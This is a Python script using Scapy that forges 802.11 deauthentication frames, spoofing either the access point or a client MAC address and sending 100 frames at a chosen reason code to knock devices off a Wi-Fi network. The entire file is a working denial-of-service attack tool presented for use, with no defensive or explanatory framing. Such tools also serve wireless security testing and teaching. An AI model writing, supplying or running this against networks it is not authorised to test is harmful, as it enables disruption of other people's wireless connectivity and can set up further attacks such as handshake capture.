#!/usr/bin/env python

from scapy.all import *
import sys
import argparse

reasons = {
    "1": "Unspecified",
    "4": "Disassociated due to inactivity",
    "5": "Disassociated because AP is unable to handle all currently associated stations",
    "8": "Deauthenticated becaus sending STA is leaving BSS"
}

def choose_reason():
    chosen = ""
    
    print("Available deauth reasons: ")
    while(chosen not in reasons):
        for r in reasons:
            print(r, reasons[r])

        chosen = input("Choose reason:")

    return chosen


def spoof_message_to_ap(ap, sta, r, i):
    print("Sending spoofed message to AP")
    dot11 = Dot11(addr1=ap, addr2=sta, addr3=ap)
    packet = RadioTap()/dot11/Dot11Deauth(reason=r)
    sendp(packet, inter=0.1, count=100, iface=i, verbose=1)


def spoof_message_to_sta(ap, sta, r, i):
    print("Sending spoofed message to STA")
    dot11 = Dot11(addr1=sta, addr2=ap, addr3=ap)
    packet = RadioTap()/dot11/Dot11Deauth(reason=r)
    sendp(packet, inter=0.1, count=100, iface=i, verbose=1)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--ap")
    parser.add_argument("-s", "--sta")
    parser.add_argument("-i", "--interface")

    args = parser.parse_args()

    ap = ""
    sta = ""
    interface = ""

    # Make sure user has supplied an AP MAC
    if args.ap == None:
        print("You have not specified an AP, exiting..")
        exit()
    else:
        ap = args.ap
    
    # If no sta argument is supplied, make sure that user wants to deauth all
    if args.sta == None:
        print("You have not specified a STA to deauth. Options are STA_MAC or 'all'")
        exit()
    elif args.sta == "all":
        print("You have chosen to deauth all clients")
        sta = "all"
    else:
        sta = args.sta

    # Get inteface name from args
    if args.interface == None:
        print("No interface specified, defaulting to wlan0mon")
        interface = "wlan0mon"
    else:
        interface = args.interface


    # Let user choose a deauth reason
    reason = choose_reason()


    # Take action depending on reason
    match(reason):
        case "1": 
            spoof_message_to_sta(ap, sta, 1, interface)   
        case "4":
            spoof_message_to_sta(ap, sta, 4, interface)  
        case "5":
            spoof_message_to_ap(ap, sta, 5, interface)   
        case "8":
            spoof_message_to_ap(ap, sta, 8, interface)  
        case _:
            print("Impossible reason")
            exit()

if __name__ == "__main__":
    main()
